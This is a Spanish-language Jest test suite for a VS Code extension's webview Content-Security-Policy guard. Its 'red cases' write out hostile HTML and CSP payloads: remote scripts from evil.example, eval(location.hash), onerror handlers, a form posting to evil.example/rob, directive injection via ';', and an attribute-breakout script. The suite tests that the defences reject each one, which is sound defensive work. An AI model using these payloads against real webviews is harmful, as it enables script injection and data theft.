/**
 * WP-V66 · CSP de webviews — test DE FACTO sobre el HTML generado.
 *
 * Corrección de la devolución. La unidad verificada YA NO ES EL FICHERO
 * sino el PUNTO DE RENDER, y la enumeración se DERIVA del AST de `src/`
 * (`renderPointAnalysis.ts`), no de una lista escrita a mano:
 *
 *  1. COBERTURA DERIVADA (D1): todo punto de render del AST tiene que estar
 *     en el censo con un render de facto, y todo lo del censo tiene que
 *     seguir existiendo en el AST. Añadir un render — en un fichero nuevo,
 *     en un ASIGNADOR ya censado o en un PRODUCTOR ya censado — pone la
 *     suite en rojo. Aliasar el objeto o partir los literales no ayuda:
 *     no se mira a qué se asigna, se mira el texto literal concatenado.
 *
 *  2. SUMIDEROS (D1): toda asignación a `.html` debe delegar en un punto de
 *     render censado; los intermediarios no pueden fabricar contenido.
 *
 *  3. INVARIANTES POR RENDER (D2/D3/D5): el MISMO motor que usa la guarda de
 *     ejecución (`findWebviewHtmlViolations`) se aplica a cada render. Cubre
 *     lo que antes no se miraba: `src` remoto en un `<script>` NONCEADO,
 *     metas CSP dentro de comentarios y la SEGUNDA meta CSP.
 *
 *  4. HELPER FAIL-CLOSED (D4): las fuentes de `style/img/font` pasan por
 *     lista blanca; comodines, orígenes externos, `;` y `"` LANZAN.
 *
 * Cada defecto lleva abajo su CASO ROJO: el mismo criterio que está verde
 * sobre `src/` se demuestra rojo sobre el vector del informe.
 */
import * as path from 'path';

// El panel de tasks arrastra el catálogo del launcher (cliente MCP real);
// aquí solo se verifica el HTML, así que se sustituye por un doble mínimo.
jest.mock('../../../src/launcher/CatalogService', () => ({
    CatalogService: {
        getInstance: jest.fn().mockReturnValue({
            onDidChange: jest.fn().mockReturnValue({ dispose: jest.fn() }),
            getSnapshot: jest.fn().mockReturnValue({ status: 'pending_settings', servers: [] }),
            refresh: jest.fn()
        })
    }
}));

import {
    buildCspContent,
    buildCspMeta,
    createNonce,
    escapeHtml,
    extractCspMetaContents,
    findWebviewHtmlViolations,
    isAllowedCspSourceToken,
    isExtensionResourceUrl,
    isLocalOrigin,
    isSafeWebviewHtml,
    requireLocalOrigin
} from '../../../src/webview/security';
import { decodeAttributeValue, scanHtml } from '../../../src/webview/htmlScan';
import { renderInertExternalPage } from '../../../src/webview/commonPages';
import {
    renderAgentValidationPage,
    renderAiCodeAnalysisPage,
    renderAiResponsePage,
    renderAiStatsPage,
    renderAiWorkflowPage,
    renderWebviewDashboardPage
} from '../../../src/webview/bootstrapPages';
import { generateAnalyticsDashboard } from '../../../src/core/bootstrap/analyticsDashboardHtml';
import { renderAnalyticsSummaryPage } from '../../../src/core/analyticsService';
import { renderCommandDashboardPage } from '../../../src/commandPaletteManager';
import { renderMcpManagerPage } from '../../../src/mcpServerManager';
import { renderUiManagerPage } from '../../../src/uiManager';
import { renderSocketMonitorPage } from '../../../src/socketMonitor';
import { renderMcpWebViewPage } from '../../../src/mcpWebViewManager';
import {
    renderLocalIframePage,
    renderWebviewErrorPage,
    renderWebviewPlaceholderPage,
    verifyDiskHtml,
    WebViewManager
} from '../../../src/webViewManager';
import { HackerCommandPanelProvider } from '../../../src/views/HackerCommandPanelProvider';
import { HackerConfigPanelProvider } from '../../../src/views/HackerConfigPanelProvider';
import { HackerControlPanelProvider } from '../../../src/views/HackerControlPanelProvider';
import { HackerTasksPanelProvider } from '../../../src/views/HackerTasksPanelProvider';
import { TeatroWebViewProvider } from '../../../src/views/TeatroWebViewProvider';
import { AgentConfigEditorProvider } from '../../../src/editors/AgentConfigEditorProvider';
import { AgentContentEditorProvider } from '../../../src/editors/AgentContentEditorProvider';
import {
    analyzeSource,
    analyzeTree,
    FnInfo,
    renderPointId,
    SinkInfo
} from './renderPointAnalysis';

// ---------------------------------------------------------------------------
// Fakes mínimos (estructurales) para renderizar fuera del Extension Host
// ---------------------------------------------------------------------------

const FAKE_CSP_SOURCE = 'vscode-resource:';

const fakeWebview: any = {
    cspSource: FAKE_CSP_SOURCE,
    asWebviewUri: (uri: any) => `vscode-resource:${(uri && (uri.path || uri.fsPath)) || ''}`,
    html: '',
    postMessage: jest.fn(),
    onDidReceiveMessage: jest.fn()
};

const fakeUri: any = { path: '/ext', fsPath: '/ext' };

function makeFakeContext(): any {
    return {
        subscriptions: [],
        extensionUri: fakeUri,
        extensionPath: '/ext',
        globalState: { get: jest.fn().mockReturnValue(undefined), update: jest.fn() },
        workspaceState: { get: jest.fn(), update: jest.fn() }
    };
}

const fakeConfigDocument: any = {
    getText: () => '{"agentId":"probe-agent"}',
    fileName: '/w/probe.config.json',
    uri: { fsPath: '/w/probe.config.json', toString: () => 'file:///w/probe.config.json' },
    lineCount: 1
};

const fakeContentDocument: any = {
    getText: () => '---\nname: Probe\n---\n# hola',
    fileName: '/w/probe.agent.md',
    uri: { fsPath: '/w/probe.agent.md', toString: () => 'file:///w/probe.agent.md' },
    lineCount: 4
};

const aggregationFixture = {
    most_used_commands: [{ command: 'x<b>', count: 3, percentage: 60 }],
    most_opened_webviews: [{ webview: 'panel', count: 2, avg_duration: 12 }],
    performance_summary: {
        avg_startup_time: 5,
        avg_command_execution_time: 7,
        memory_usage_trend: [1, 2],
        slowest_operations: [{ operation: 'op', avg_duration: 9 }]
    },
    error_frequency: [{ error_type: 'E', count: 1 }],
    usage_patterns: {
        peak_usage_hours: [9, 10],
        most_active_days: ['mon'],
        session_duration_avg: 60000
    }
};

const aiResponseFixture = {
    confidence: 80,
    content: { message: 'hola <script>alert(1)</script>' },
    metadata: { processing_time: 12 }
};

const aiStatsFixture = {
    total_requests: 5,
    success_rate: 0.8,
    avg_confidence: 0.7,
    avg_processing_time: 30,
    capabilities_used: { chat: 3 }
};

// ---------------------------------------------------------------------------
// CENSO · un punto de render = una función que produce HTML, con su render
// de facto. El identificador es `fichero::función`, el mismo que deriva el
// AST: así el censo y la derivación se comparan término a término.
// ---------------------------------------------------------------------------

interface CensoEntry {
    /** `fichero::función`, igual que `renderPointId` */
    id: string;
    render: () => string;
}

function hackerPanelRender(ProviderCtor: any): () => string {
    return () => {
        const provider = new ProviderCtor(fakeUri, makeFakeContext());
        return (provider as any).getHtmlContent(fakeWebview);
    };
}

const CENSO: CensoEntry[] = [
    // --- documentos completos -------------------------------------------------
    { id: 'src/views/BaseHackerPanelProvider.ts::generateBaseHtml', render: hackerPanelRender(HackerCommandPanelProvider) },
    {
        id: 'src/views/TeatroWebViewProvider.ts::_getHtmlForWebview',
        render: () => {
            const p: any = new TeatroWebViewProvider(fakeUri, makeFakeContext(), {} as any);
            return p._getHtmlForWebview(fakeWebview);
        }
    },
    {
        id: 'src/editors/AgentConfigEditorProvider.ts::getHtmlForWebview',
        render: () => {
            const p: any = new (AgentConfigEditorProvider as any)(makeFakeContext());
            return p.getHtmlForWebview(fakeWebview, fakeConfigDocument);
        }
    },
    {
        id: 'src/editors/AgentContentEditorProvider.ts::getHtmlForWebview',
        render: () => {
            const p: any = new (AgentContentEditorProvider as any)(makeFakeContext());
            return p.getHtmlForWebview(fakeWebview, fakeContentDocument);
        }
    },
    { id: 'src/core/bootstrap/analyticsDashboardHtml.ts::generateAnalyticsDashboard', render: () => generateAnalyticsDashboard(aggregationFixture) },
    { id: 'src/core/analyticsService.ts::renderAnalyticsSummaryPage', render: () => renderAnalyticsSummaryPage([['Total Events', 3], ['Sesión', 's<x>']]) },
    { id: 'src/webview/bootstrapPages.ts::renderAiResponsePage', render: () => renderAiResponsePage(aiResponseFixture) },
    { id: 'src/webview/bootstrapPages.ts::renderAiCodeAnalysisPage', render: () => renderAiCodeAnalysisPage(aiResponseFixture, 'const a = "<script>"', 'ts') },
    { id: 'src/webview/bootstrapPages.ts::renderAiWorkflowPage', render: () => renderAiWorkflowPage(aiResponseFixture) },
    { id: 'src/webview/bootstrapPages.ts::renderAiStatsPage', render: () => renderAiStatsPage(aiStatsFixture) },
    { id: 'src/webview/bootstrapPages.ts::renderAgentValidationPage', render: () => renderAgentValidationPage(1, 1, ['✅ ok', '❌ <img src=x onerror=alert(1)>']) },
    { id: 'src/webview/bootstrapPages.ts::renderWebviewDashboardPage', render: () => renderWebviewDashboardPage() },
    { id: 'src/commandPaletteManager.ts::renderCommandDashboardPage', render: () => renderCommandDashboardPage() },
    { id: 'src/mcpServerManager.ts::renderMcpManagerPage', render: () => renderMcpManagerPage() },
    { id: 'src/uiManager.ts::renderUiManagerPage', render: () => renderUiManagerPage() },
    { id: 'src/socketMonitor.ts::renderSocketMonitorPage', render: () => renderSocketMonitorPage('http://localhost:3000') },
    { id: 'src/mcpWebViewManager.ts::renderMcpWebViewPage', render: () => renderMcpWebViewPage('http://localhost:4200', 'Web Local') },
    { id: 'src/webViewManager.ts::renderLocalIframePage', render: () => renderLocalIframePage('http://127.0.0.1:4201', 'UI Local') },
    { id: 'src/webViewManager.ts::renderWebviewErrorPage', render: () => renderWebviewErrorPage('boom <script>') },
    { id: 'src/webViewManager.ts::renderWebviewPlaceholderPage', render: () => renderWebviewPlaceholderPage('Titulo') },
    { id: 'src/webview/commonPages.ts::renderInertExternalPage', render: () => renderInertExternalPage('https://example.com/x', 'Externo') },

    // --- cuerpos de panel: fragmentos que sólo existen dentro del documento
    //     base, con render de facto propio (el documento completo del panel) ---
    { id: 'src/views/HackerCommandPanelProvider.ts::getHtmlContent', render: hackerPanelRender(HackerCommandPanelProvider) },
    { id: 'src/views/HackerConfigPanelProvider.ts::getHtmlContent', render: hackerPanelRender(HackerConfigPanelProvider) },
    {
        id: 'src/views/HackerControlPanelProvider.ts::getHtmlContent',
        render: () => {
            WebViewManager.getInstance(makeFakeContext());
            return hackerPanelRender(HackerControlPanelProvider)();
        }
    },
    { id: 'src/views/HackerTasksPanelProvider.ts::getHtmlContent', render: hackerPanelRender(HackerTasksPanelProvider) }
];

const CENSO_IDS = new Set(CENSO.map(e => e.id));

// ---------------------------------------------------------------------------
// Derivación del AST sobre `src/` (fuente de verdad de la enumeración)
// ---------------------------------------------------------------------------

const REPO_ROOT = path.resolve(__dirname, '../../..');
const SRC_ROOT = path.join(REPO_ROOT, 'src');

const analysis = analyzeTree(SRC_ROOT, REPO_ROOT);

const derivedDocs = analysis.functions.filter(f => f.kind === 'document');
const derivedFrags = analysis.functions.filter(f => f.kind === 'fragment');

/** Índice nombre simple → implementaciones (grafo de llamadas por nombre). */
const byName = new Map<string, FnInfo[]>();
for (const fn of analysis.functions) {
    const list = byName.get(fn.name) ?? [];
    list.push(fn);
    byName.set(fn.name, list);
}

/**
 * BFS por el grafo de llamadas desde un nombre simple hasta un punto de
 * render censado. Devuelve las funciones que quedan EN EL CAMINO (no todo
 * lo que se visitó de paso: un delegador puede llamar a cosas ajenas al
 * HTML, y ésas no son intermediarios de nada).
 */
function pathToCensus(startName: string, maxDepth = 5): FnInfo[] | undefined {
    const prev = new Map<string, string | undefined>([[startName, undefined]]);
    const seen = new Set<string>();
    let frontier = [startName];
    for (let depth = 0; depth <= maxDepth && frontier.length > 0; depth++) {
        const next: string[] = [];
        for (const name of frontier) {
            if (seen.has(name)) {
                continue;
            }
            seen.add(name);
            const impls = byName.get(name) ?? [];
            if (impls.some(i => CENSO_IDS.has(renderPointId(i)))) {
                const chain: string[] = [];
                let cur: string | undefined = name;
                while (cur !== undefined) {
                    chain.unshift(cur);
                    cur = prev.get(cur);
                }
                // intermediarios = todo lo del camino salvo el render censado
                return chain.slice(0, -1).flatMap(n => byName.get(n) ?? []);
            }
            for (const impl of impls) {
                for (const callee of impl.callees) {
                    if (!prev.has(callee)) {
                        prev.set(callee, name);
                        next.push(callee);
                    }
                }
            }
        }
        frontier = next;
    }
    return undefined;
}

/** Nombres alcanzables desde los puntos de render censados (para fragmentos). */
const reachableFromCensus = (() => {
    const seen = new Set<string>();
    let frontier = analysis.functions
        .filter(f => CENSO_IDS.has(renderPointId(f)))
        .flatMap(f => f.callees);
    for (let depth = 0; depth < 5 && frontier.length > 0; depth++) {
        const next: string[] = [];
        for (const name of frontier) {
            if (seen.has(name)) {
                continue;
            }
            seen.add(name);
            for (const impl of byName.get(name) ?? []) {
                next.push(...impl.callees);
            }
        }
        frontier = next;
    }
    return seen;
})();

/** Huecos de cobertura: puntos de render derivados que el censo no cubre. */
function coverageGaps(fns: FnInfo[]): string[] {
    return fns.filter(f => f.kind === 'document').map(renderPointId).filter(id => !CENSO_IDS.has(id));
}

/** Sumideros injustificados: `.html =` que no delega en un render censado. */
function unjustifiedSinks(sinks: SinkInfo[]): string[] {
    const bad: string[] = [];
    for (const sink of sinks) {
        if (!sink.callee) {
            bad.push(`${sink.file}:${sink.line} — el HTML no procede de una llamada: ${sink.code}`);
            continue;
        }
        const intermediates = pathToCensus(sink.callee);
        if (!intermediates) {
            bad.push(`${sink.file}:${sink.line} — "${sink.callee}" no alcanza ningún render censado`);
            continue;
        }
        for (const mid of intermediates) {
            if (mid.kind === 'none' && !mid.pureDelegator && !mid.validates) {
                bad.push(
                    `${sink.file}:${sink.line} — intermediario "${renderPointId(mid)}" ni delega en limpio ni valida`
                );
            }
        }
    }
    return bad;
}

// ---------------------------------------------------------------------------
// 1 · Cobertura derivada: la enumeración no la escribe nadie a mano (D1)
// ---------------------------------------------------------------------------

describe('WP-V66 · censo derivado del AST (unidad = punto de render)', () => {
    test('todo documento de webview derivado de src/ está cubierto por el censo', () => {
        expect(coverageGaps(analysis.functions)).toEqual([]);
    });

    test('el censo no lista puntos de render muertos (todo id sigue derivándose)', () => {
        const derivedIds = new Set(
            analysis.functions.filter(f => f.kind !== 'none').map(renderPointId)
        );
        const muertos = [...CENSO_IDS].filter(id => !derivedIds.has(id));
        expect(muertos).toEqual([]);
    });

    test('todo fragmento HTML derivado está conectado a un render censado', () => {
        const sueltos = derivedFrags
            .filter(f => !CENSO_IDS.has(renderPointId(f)))
            .filter(f => !f.ancestors.some(a => byName.get(a)?.some(impl => CENSO_IDS.has(renderPointId(impl)))))
            .filter(f => !reachableFromCensus.has(f.name))
            .filter(f => !pathToCensus(f.name))
            .map(renderPointId);
        expect(sueltos).toEqual([]);
    });

    test('la contabilidad declarada del censo se sostiene y es derivada', () => {
        // 25 puntos de render = 21 documentos completos + 4 cuerpos de panel
        expect(derivedDocs.length).toBe(21);
        expect(CENSO.length).toBe(25);
        // repartidos en 18 ficheros productores únicos
        const ficherosProductores = new Set(CENSO.map(e => e.id.split('::')[0]));
        expect(ficherosProductores.size).toBe(18);
        // más los ficheros que sólo asignan HTML producido en otro sitio
        const ficherosAsignadores = new Set(
            analysis.sinks.map(s => s.file).filter(f => !ficherosProductores.has(f))
        );
        expect([...ficherosAsignadores].sort()).toEqual([
            'src/core/bootstrap/commands/agentManagementCommands.ts',
            'src/core/bootstrap/commands/aiCommands.ts',
            'src/core/bootstrap/commands/analyticsCommands.ts',
            'src/core/bootstrap/commands/webviewCommands.ts'
        ]);
    });

    test('todo sumidero `.html =` de src/ delega en un render censado', () => {
        expect(unjustifiedSinks(analysis.sinks)).toEqual([]);
    });
});

// ---------------------------------------------------------------------------
// 2 · Invariantes por punto de render — mismo motor que la guarda de ejecución
// ---------------------------------------------------------------------------

describe('WP-V66 · CSP de facto por punto de render censado', () => {
    for (const entry of CENSO) {
        test(`${entry.id} — sin violaciones de la política de webview`, () => {
            expect(findWebviewHtmlViolations(entry.render())).toEqual([]);
        });

        test(`${entry.id} — nonce distinto entre renders`, () => {
            const nonceOf = (html: string) =>
                extractCspMetaContents(html).flatMap(c => Array.from(c.matchAll(/'nonce-([^']+)'/g)).map(m => m[1]));
            const a = nonceOf(entry.render());
            const b = nonceOf(entry.render());
            expect(a.length).toBeGreaterThan(0);
            expect(b.length).toBeGreaterThan(0);
            expect(a[0]).not.toEqual(b[0]);
        });
    }
});

// ---------------------------------------------------------------------------
// 3 · Cerco local: iframes solo a peers locales; lo externo queda inerte
// ---------------------------------------------------------------------------

describe('WP-V66 · cerco local-first en iframes', () => {
    test('URL externa en mcpWebViewManager degrada a página inerte (sin iframe, sin ancla viva)', () => {
        const html = renderMcpWebViewPage('https://evil.example.com', 'Externo');
        expect(findWebviewHtmlViolations(html)).toEqual([]);
        expect(html).not.toMatch(/<iframe/i);
        expect(html).not.toMatch(/<a\s/i);
        expect(html).not.toMatch(/frame-src/);
    });

    test('URL externa en webViewManager degrada a página inerte', () => {
        const html = renderLocalIframePage('https://evil.example.com', 'Externo');
        expect(findWebviewHtmlViolations(html)).toEqual([]);
        expect(html).not.toMatch(/<iframe/i);
        expect(html).not.toMatch(/frame-src/);
    });

    test('URL local sí produce frame-src acotado a su origen', () => {
        const html = renderLocalIframePage('http://localhost:4201/app', 'Local');
        expect(extractCspMetaContents(html)[0]).toMatch(/frame-src http:\/\/localhost:4201/);
    });
});

// ---------------------------------------------------------------------------
// 4 · Helper: fail-closed (el intento de bypass LANZA, no degrada)
// ---------------------------------------------------------------------------

describe('WP-V66 · helper de CSP fail-closed', () => {
    test('createNonce: criptográfico, 22+ chars base64, distinto por llamada', () => {
        const a = createNonce();
        const b = createNonce();
        expect(a).toMatch(/^[A-Za-z0-9+/=]{22,}$/);
        expect(a).not.toEqual(b);
    });

    test('buildCspContent rechaza unsafe-inline colado por cualquier fuente', () => {
        expect(() => buildCspContent({ styleSource: "'unsafe-inline'" })).toThrow();
        expect(() => buildCspContent({ scriptNonce: "x' 'unsafe-inline" })).toThrow();
        expect(() => buildCspContent({ imgSource: "'unsafe-eval'" })).toThrow();
    });

    test('buildCspContent rechaza orígenes externos en frame/connect', () => {
        expect(() => buildCspContent({ frameOrigins: ['https://example.com'] })).toThrow();
        expect(() => buildCspContent({ connectOrigins: ['http://10.0.0.5:3000'] })).toThrow();
        expect(buildCspContent({ frameOrigins: ['http://localhost:4200'] }))
            .toContain('frame-src http://localhost:4200');
    });

    test('requireLocalOrigin / isLocalOrigin: solo peers locales', () => {
        expect(isLocalOrigin('http://localhost:3000')).toBe(true);
        expect(isLocalOrigin('http://127.0.0.1:8080/x')).toBe(true);
        expect(isLocalOrigin('https://example.com')).toBe(false);
        expect(isLocalOrigin('file:///etc/passwd')).toBe(false);
        expect(isLocalOrigin('javascript:alert(1)')).toBe(false);
        expect(isLocalOrigin('http://localhost.evil.com')).toBe(false);
        expect(() => requireLocalOrigin('https://example.com')).toThrow();
    });

    test('buildCspMeta emite default-src none como base', () => {
        expect(buildCspMeta({})).toContain(`content="default-src 'none';"`);
    });

    test('escapeHtml neutraliza los cinco metacaracteres', () => {
        expect(escapeHtml(`<script>"'&`)).toBe('&lt;script&gt;&quot;&#39;&amp;');
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · D1 — el censo es de puntos de render, no de ficheros
// ---------------------------------------------------------------------------

describe('WP-V66 · D1 · los tres bypass del censo por ficheros quedan en rojo', () => {
    test('1B · alias del webview + literales partidos en un fichero nuevo', () => {
        const hostil = `
            import * as vscode from 'vscode';
            export function abrirPanelSospechoso(panel: any) {
                const wv = panel.webview;                       // alias: el nombre no importa
                wv.html = '<!DOCTYPE ' + 'html>' +              // literal partido
                    '<html><head></head><body>' +
                    '<script>eval(location.hash)</script>' +
                    '<div onclick="fetch(1)" style="color:red"></div>' +
                    '</body></html>';
            }`;
        const a = analyzeSource('src/panelSospechoso.ts', hostil);

        // el punto de render aparece pese al alias y a los literales partidos
        expect(coverageGaps(a.functions)).toEqual([
            'src/panelSospechoso.ts::abrirPanelSospechoso'
        ]);
        // y además el sumidero no delega en ningún render censado
        expect(unjustifiedSinks(a.sinks).length).toBeGreaterThan(0);
    });

    test('1B-bis · Object.assign(panel.webview, { html }) también es sumidero', () => {
        const hostil = `
            export function colar(panel: any, html: string) {
                Object.assign(panel.webview, { html });
            }`;
        const a = analyzeSource('src/colar.ts', hostil);
        expect(a.sinks.length).toBe(1);
        expect(unjustifiedSinks(a.sinks).length).toBe(1);
    });

    test('7 · render hostil añadido a un ASIGNADOR ya censado', () => {
        const hostil = `
            import { renderAiResponsePage } from '../../../webview/bootstrapPages';
            export function registerAiCommands(ctx: any) {
                const panel: any = {};
                panel.webview.html = renderAiResponsePage({});
            }
            export function registerAiDebugPanel(panel: any) {
                panel.webview.html = \`<!DOCTYPE html><html><body>
                    <script src="https://evil.example/x.js"></script></body></html>\`;
            }`;
        const a = analyzeSource('src/core/bootstrap/commands/aiCommands.ts', hostil);
        expect(coverageGaps(a.functions)).toEqual([
            'src/core/bootstrap/commands/aiCommands.ts::registerAiDebugPanel'
        ]);
    });

    test('8 · render nº 26 exportado desde un PRODUCTOR ya censado', () => {
        const hostil = `
            export function renderPanelExtra(): string {
                return \`<!DOCTYPE html><html><head></head><body>ok</body></html>\`;
            }`;
        const a = analyzeSource('src/webview/bootstrapPages.ts', hostil);
        expect(coverageGaps(a.functions)).toEqual([
            'src/webview/bootstrapPages.ts::renderPanelExtra'
        ]);
    });

    test('un sumidero que no procede de una llamada (HTML remoto) queda en rojo', () => {
        const hostil = `
            export async function pintar(panel: any) {
                const remoto = await (await fetch('https://evil.example/p')).text();
                panel.webview.html = remoto;
            }`;
        const a = analyzeSource('src/pintar.ts', hostil);
        expect(unjustifiedSinks(a.sinks)).toEqual([
            'src/pintar.ts:4 — el HTML no procede de una llamada: panel.webview.html = remoto'
        ]);
    });

    test('el mismo criterio está VERDE sobre src/ (no es un test que siempre falla)', () => {
        expect(coverageGaps(analysis.functions)).toEqual([]);
        expect(unjustifiedSinks(analysis.sinks)).toEqual([]);
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · D2 — el nonce NO redime a un <script src> remoto
// ---------------------------------------------------------------------------

describe('WP-V66 · D2 · script externo CON nonce queda en rojo', () => {
    const conNonce = (extra: string) => {
        const nonce = createNonce();
        return `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
            <body>${extra.replace(/__NONCE__/g, nonce)}</body></html>`;
    };

    test('<script nonce src="https://evil.example/x.js"> es violación', () => {
        const html = conNonce('<script nonce="__NONCE__" src="https://evil.example/x.js"></script>');
        const v = findWebviewHtmlViolations(html);
        expect(v).toContainEqual(expect.stringContaining('recurso remoto en <script src>'));
        expect(isSafeWebviewHtml(html)).toBe(false);
    });

    test('un <script src> de recurso propio SÍ pasa (no es un rechazo indiscriminado)', () => {
        const html = conNonce('<script nonce="__NONCE__" src="vscode-resource:/ext/media/x.js"></script>');
        expect(findWebviewHtmlViolations(html)).toEqual([]);
    });

    test('protocol-relative //evil y esquemas raros no cuelan como "relativo"', () => {
        expect(isExtensionResourceUrl('//evil.example/x.js')).toBe(false);
        expect(isExtensionResourceUrl('\\\\evil.example\\x.js')).toBe(false);
        expect(isExtensionResourceUrl('javascript:alert(1)')).toBe(false);
        expect(isExtensionResourceUrl('data:text/javascript,alert(1)')).toBe(false);
        expect(isExtensionResourceUrl('https://cdn.jsdelivr.net/x.js')).toBe(false);
        expect(isExtensionResourceUrl('media/x.js')).toBe(true);
        expect(isExtensionResourceUrl('vscode-resource:/ext/media/x.js')).toBe(true);
        expect(isExtensionResourceUrl('https://file%2B.vscode-resource.vscode-cdn.net/a.css')).toBe(true);
    });

    test('CSS, iframe y form remotos también caen', () => {
        expect(findWebviewHtmlViolations(conNonce('<link href="https://evil.example/a.css" rel="stylesheet">')))
            .toContainEqual(expect.stringContaining('recurso remoto en <link href>'));
        expect(findWebviewHtmlViolations(conNonce('<iframe src="https://evil.example/"></iframe>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <iframe src>'));
        expect(findWebviewHtmlViolations(conNonce('<form action="https://evil.example/rob"></form>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <form action>'));
        expect(findWebviewHtmlViolations(conNonce('<base href="https://evil.example/">')))
            .toContainEqual(expect.stringContaining('<base> presente'));
    });

    test('un <script> sin nonce sigue cayendo', () => {
        expect(findWebviewHtmlViolations(conNonce('<script>alert(1)</script>')))
            .toContainEqual(expect.stringContaining('<script> sin nonce'));
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · D3 — presencia de meta ≠ política, y HTML de disco
// ---------------------------------------------------------------------------

describe('WP-V66 · D3 · la meta CSP se valida, no se cuenta', () => {
    const META_OK = `<meta http-equiv="Content-Security-Policy" content="default-src 'none';">`;

    test('meta CSP dentro de un comentario HTML NO cuenta', () => {
        const html = `<!DOCTYPE html><html><head><!-- ${META_OK} --></head><body></body></html>`;
        expect(extractCspMetaContents(html)).toEqual([]);
        expect(findWebviewHtmlViolations(html))
            .toContainEqual(expect.stringContaining('sin meta Content-Security-Policy'));
    });

    test('meta CSP permisiva o vacía NO cuenta', () => {
        const permisiva = `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'"></head></html>`;
        expect(findWebviewHtmlViolations(permisiva).length).toBeGreaterThan(0);

        const vacia = `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content=""></head></html>`;
        expect(findWebviewHtmlViolations(vacia))
            .toContainEqual(expect.stringContaining("no arranca en default-src 'none'"));
    });

    test('verifyDiskHtml sustituye por página de error todo HTML de disco hostil', () => {
        const casos = [
            `<!DOCTYPE html><html><head><!-- ${META_OK} --></head><body><script>evil()</script></body></html>`,
            `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head></html>`,
            `<!DOCTYPE html><html><head>${META_OK}</head><body><script src="https://evil.example/x.js"></script></body></html>`,
            `<html><body onload="evil()"></body></html>`
        ];
        for (const hostil of casos) {
            const servido = verifyDiskHtml(hostil, '/disco/index.html');
            expect(servido).toContain('Local content rejected');
            // lo que se sirve en su lugar cumple la política...
            expect(findWebviewHtmlViolations(servido)).toEqual([]);
            // ...y del HTML hostil no sobrevive ningún marcado vivo: si la
            // URL o el handler aparecen, es escapados dentro de un <p>.
            expect(servido).not.toMatch(/<script(?![^>]*nonce=)/i);
            expect(servido).not.toMatch(/\son[a-z]+\s*=\s*["']/i);
            expect(servido).not.toMatch(/<[^>]*evil\.example[^>]*>/i);
        }
    });

    test('verifyDiskHtml deja pasar el HTML de disco que sí cumple', () => {
        const bueno = renderWebviewPlaceholderPage('Local');
        expect(verifyDiskHtml(bueno, '/disco/index.html')).toBe(bueno);
    });

    test('los scripts de un panel de disco son opt-in, no el defecto', () => {
        const src = require('fs').readFileSync(path.join(SRC_ROOT, 'webViewManager.ts'), 'utf8');
        expect(src).toContain('enableScripts: config.enableScripts === true');
        expect(src).not.toContain('enableScripts: config.enableScripts !== false');
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · D4 — fuentes de style/img/font sin validar ni escapar
// ---------------------------------------------------------------------------

describe('WP-V66 · D4 · toda fuente CSP pasa por lista blanca', () => {
    test('orígenes externos y comodines LANZAN en style/img/font', () => {
        expect(() => buildCspContent({ styleSource: 'https://evil.example' })).toThrow();
        expect(() => buildCspContent({ styleSource: '*' })).toThrow();
        expect(() => buildCspContent({ imgSource: 'https://tracker.example' })).toThrow();
        expect(() => buildCspContent({ imgSource: '*' })).toThrow();
        expect(() => buildCspContent({ fontSource: 'https://fonts.gstatic.com' })).toThrow();
        expect(() => buildCspContent({ fontSource: 'data:' })).toThrow();
    });

    test('inyección de directivas por `;` LANZA (no acaba en script-src *)', () => {
        expect(() => buildCspContent({ styleSource: "vscode-resource:; script-src *" })).toThrow();
        expect(() => buildCspContent({ imgSource: "vscode-resource:;script-src https://evil.example" })).toThrow();
    });

    test('breakout del atributo content= por `"` LANZA (no inyecta <script> en el head)', () => {
        const payload = `vscode-resource:"><script>alert(1)</script><meta x="`;
        expect(() => buildCspContent({ styleSource: payload })).toThrow();
        expect(() => buildCspMeta({ styleSource: payload })).toThrow();
    });

    test('las fuentes legítimas siguen pasando (cspSource real de VS Code)', () => {
        expect(buildCspContent({ styleSource: 'vscode-resource:' })).toContain('style-src vscode-resource:');
        expect(buildCspContent({ styleSource: 'vscode-webview-resource:' })).toContain('vscode-webview-resource:');
        expect(buildCspContent({ styleSource: 'https://*.vscode-cdn.net' })).toContain('https://*.vscode-cdn.net');
        expect(buildCspContent({ imgSource: "'self'" })).toContain("img-src 'self'");
        expect(isAllowedCspSourceToken("'none'")).toBe(true);
        expect(isAllowedCspSourceToken('*')).toBe(false);
        expect(isAllowedCspSourceToken('https://evil.example')).toBe(false);
    });

    test('un nonce que no es base64 LANZA', () => {
        expect(() => buildCspContent({ scriptNonce: "abc' 'self" })).toThrow();
        expect(() => buildCspContent({ styleNonce: 'abc;script-src *' })).toThrow();
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · DD4 — valores de atributo SIN COMILLAS
//
// El parser anterior sólo leía valores entrecomillados: `src=…` sin comillas
// devolvía undefined y la comprobación se saltaba en silencio. HTML permite
// esos valores y el navegador los ejecuta.
// ---------------------------------------------------------------------------

describe('WP-V66 · DD4 · atributos sin comillas', () => {
    const doc = (body: string) => {
        const nonce = createNonce();
        return `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
            <body>${body.replace(/__NONCE__/g, nonce)}</body></html>`;
    };

    test('el tokenizador lee el valor sin comillas (antes: undefined)', () => {
        const tags = scanHtml('<script nonce=abc src=https://evil.example/x.js></script>').tags;
        expect(tags[0].attrs.get('src')).toBe('https://evil.example/x.js');
        expect(tags[0].attrs.get('nonce')).toBe('abc');
    });

    test('<script src=… sin comillas> es violación', () => {
        expect(findWebviewHtmlViolations(doc('<script nonce=__NONCE__ src=https://evil.example/x.js></script>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <script src>'));
    });

    test('el vector exacto: nonce VÁLIDO y entrecomillado, sólo el src sin comillas', () => {
        // Sin ambigüedad: el nonce es correcto, así que la ÚNICA violación
        // posible es el recurso remoto. Este documento devolvía [] antes.
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
